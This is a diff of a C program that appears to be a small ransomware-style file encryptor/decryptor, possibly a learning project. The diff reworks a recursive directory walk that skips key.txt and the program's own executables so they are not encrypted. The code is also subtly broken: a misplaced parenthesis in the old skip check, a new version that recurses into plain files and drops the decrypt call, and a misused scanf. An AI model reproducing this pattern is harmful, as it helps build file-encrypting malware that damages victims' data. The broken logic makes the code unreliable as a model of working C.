@@ -120,7 +120,7 @@ void decrypt(unsigned char *key, char *fileName) {
 int isDir(const char* fileName) {
     struct stat path;
     stat(fileName, &path);
-    return S_ISREG(path.st_mode);
+    return S_ISDIR(path.st_mode);
 }
 
 void recursiveSearch(unsigned char *key, char *dirName) {
@@ -132,23 +132,13 @@ void recursiveSearch(unsigned char *key, char *dirName) {
 
     while((entry=readdir(curr))) {
         char pathLocation[1024];
-        if (entry->d_type == DT_DIR) {
-            // Ignore . and .. files (linux testing)
-            if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) {
-                continue;
-            }
-            snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
-            printf("%s\n", pathLocation);
-            recursiveSearch(key, pathLocation);
-        } else {            
-            snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
-            // Blacklist files to avoid encryption on
-            if (!strcmp(entry->d_name, "key.txt") || !strcmp(entry->d_name, "main.out" || !strcmp(entry->d_name, "main.exe"))) {
-                continue;
-            }
-            printf("%s\n", pathLocation);
-            //decrypt(key, pathLocation);
+        // Ignore . and .. files (linux testing)
+        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..") || !strcmp(entry->d_name, "key.txt") || !strcmp(entry->d_name, "main.out") || !strcmp(entry->d_name, "main.exe")) {
+            continue;
         }
+        snprintf(pathLocation, sizeof(pathLocation), "%s/%s", dirName, entry->d_name);
+        printf("%s\n", pathLocation);
+        recursiveSearch(key, pathLocation);
     }
 }
 
@@ -177,7 +167,7 @@ int main (int argc, char *argv[]) {
     // Anything below this directory will not be scanned and encrypted.
     char directory[] = "files";
     recursiveSearch(key, directory);
-
+    scanf("waiting...");
     // We don't like our keys being stored in the memory
     free(key);
     return 0;
